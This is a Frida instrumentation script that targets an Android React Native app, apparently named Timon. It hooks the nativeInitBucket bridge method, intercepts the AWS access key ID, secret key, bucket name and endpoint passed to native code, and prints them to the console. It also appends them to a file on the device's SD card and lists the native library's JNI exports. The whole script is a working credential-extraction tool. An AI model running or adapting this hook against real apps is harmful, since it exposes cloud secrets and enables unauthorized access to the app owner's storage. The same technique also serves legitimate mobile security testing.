/**
 * Frida Script to Extract AWS Credentials from Timon App
 * 
 * This script hooks into the nativeInitBucket method to intercept
 * and log AWS credentials as they are passed through the JNI layer.
 * 
 * Usage:
 *   frida -U -f com.rustexample -l frida_extract_credentials.js --no-pause
 * 
 * Or attach to running process:
 *   frida -U com.rustexample -l frida_extract_credentials.js
 */

console.log("[*] Frida script loaded - Waiting for app to initialize...");

Java.perform(function() {
    console.log("[*] Java VM attached");
    
    try {
        // Wait for TimonModule class to be available
        var TimonModule = Java.use("com.rustexample.TimonModule");
        console.log("[+] TimonModule class found");
        
        // Hook the React Native bridge method
        TimonModule.nativeInitBucket.overload(
            'java.lang.String',
            'java.lang.String', 
            'java.lang.String',
            'java.lang.String',
            'java.lang.String',
            'com.facebook.react.bridge.Promise'
        ).implementation = function(
            bucket_endpoint, 
            bucket_name, 
            access_key_id, 
            secret_access_key, 
            bucket_region, 
            promise
        ) {
            console.log("\n" + "=".repeat(60));
            console.log("[!] CREDENTIALS INTERCEPTED!");
            console.log("=".repeat(60));
            console.log("[*] Timestamp: " + new Date().toISOString());
            console.log("[*] Bucket Endpoint: " + bucket_endpoint);
            console.log("[*] Bucket Name: " + bucket_name);
            console.log("[*] Access Key ID: " + access_key_id);
            console.log("[*] Secret Access Key: " + secret_access_key);
            console.log("[*] Bucket Region: " + bucket_region);
            console.log("=".repeat(60) + "\n");
            
            // Save to file (optional - requires file system access)
            try {
                var File = Java.use("java.io.File");
                var FileWriter = Java.use("java.io.FileWriter");
                var BufferedWriter = Java.use("java.io.BufferedWriter");
                
                var outputFile = File.$new("/sdcard/timon_credentials.txt");
                var writer = new FileWriter(outputFile, true);
                var bufferedWriter = new BufferedWriter(writer);
                
                bufferedWriter.write("=== Credentials Dump ===\n");
                bufferedWriter.write("Timestamp: " + new Date().toISOString() + "\n");
                bufferedWriter.write("Bucket Endpoint: " + bucket_endpoint + "\n");
                bufferedWriter.write("Bucket Name: " + bucket_name + "\n");
                bufferedWriter.write("Access Key ID: " + access_key_id + "\n");
                bufferedWriter.write("Secret Access Key: " + secret_access_key + "\n");
                bufferedWriter.write("Bucket Region: " + bucket_region + "\n");
                bufferedWriter.write("=".repeat(60) + "\n\n");
                
                bufferedWriter.close();
                writer.close();
                console.log("[+] Credentials saved to /sdcard/timon_credentials.txt");
            } catch (e) {
                console.log("[-] Could not save to file: " + e);
            }
            
            // Call original method
            return this.nativeInitBucket(
                bucket_endpoint, 
                bucket_name, 
                access_key_id, 
                secret_access_key, 
                bucket_region, 
                promise
            );
        };
        
        console.log("[+] Hook installed on TimonModule.nativeInitBucket");
        console.log("[*] Waiting for credentials to be passed...");
        
    } catch (e) {
        console.log("[-] Error: " + e);
        console.log("[-] Stack trace: " + Java.use("android.util.Log").getStackTraceString(e));
    }
});

// Also hook the native external function (if accessible)
setTimeout(function() {
    try {
        var nativeLib = Process.findModuleByName("libtsdb_timon.so");
        if (nativeLib) {
            console.log("[+] Found native library: " + nativeLib.name);
            console.log("[*] Base address: " + nativeLib.base);
            
            // Try to find JNI function
            var exports = nativeLib.enumerateExports();
            console.log("[*] Found " + exports.length + " exports");
            
            // Look for JNI function pattern
            for (var i = 0; i < exports.length; i++) {
                var exp = exports[i];
                if (exp.name.indexOf("nativeInitBucket") !== -1 || 
                    exp.name.indexOf("Java_") !== -1) {
                    console.log("[+] Found potential JNI function: " + exp.name + " @ " + exp.address);
                }
            }
        } else {
            console.log("[-] Native library not found yet, may need to wait for app to load");
        }
    } catch (e) {
        console.log("[-] Error finding native library: " + e);
    }
}, 2000);

// Monitor for React Native bridge calls
Java.perform(function() {
    try {
        var ReactMethod = Java.use("com.facebook.react.bridge.ReactMethod");
        console.log("[*] Monitoring React Native bridge...");
    } catch (e) {
        // React Native may not be loaded yet
    }
});
